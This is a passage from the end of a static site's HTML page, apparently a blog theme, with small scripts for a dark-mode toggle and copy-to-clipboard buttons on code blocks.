        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
